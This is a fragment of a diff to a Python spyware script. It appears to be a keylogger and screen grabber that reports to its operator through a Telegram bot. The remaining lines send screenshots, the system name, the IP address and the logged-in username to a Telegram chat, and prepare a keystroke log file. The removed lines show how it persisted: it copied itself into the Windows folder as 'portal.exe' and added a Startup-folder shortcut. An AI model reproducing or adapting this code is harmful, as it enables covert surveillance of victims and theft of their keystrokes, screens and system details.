@@ -1,5 +1,3 @@
-
-win_folder = os.environ['WINDIR']
 def send_message_to_group(chat_id, screenshot):
     url = f"https://api.telegram.org/bot{telegram_bot_token}/sendPhoto"
     data = {'chat_id': chat_id, 'caption': f"System Name: {system_name}\nIP Address: {ip}"}
@@ -22,19 +20,6 @@ def send_message_on_start():
     username = os.getlogin()
     bot.send_message(chat_id, f"Подключен пк: {username}")
 send_message_on_start()
-hide_location = os.path.join(win_folder, 'portal.exe')
-def startup():
-    shell = Dispatch('WScript.Shell')
-    startup_folder = shell.SpecialFolders("Startup")
-    return startup_folder
-target_file = os.path.join(startup(), 'portal.lnk')
-if argv[0].endswith('.exe'):
-    copyfile(argv[0], hide_location)
-    shell = Dispatch('WScript.Shell')
-    shortcut = shell.CreateShortCut(target_file)
-    shortcut.Targetpath = hide_location
-    shortcut.WorkingDirectory = win_folder
-    shortcut.save()
 user = os.environ.get("USERNAME")
 user_folder = os.path.expanduser('~')
 log_file = os.path.join(user_folder, 'keylogs.txt')
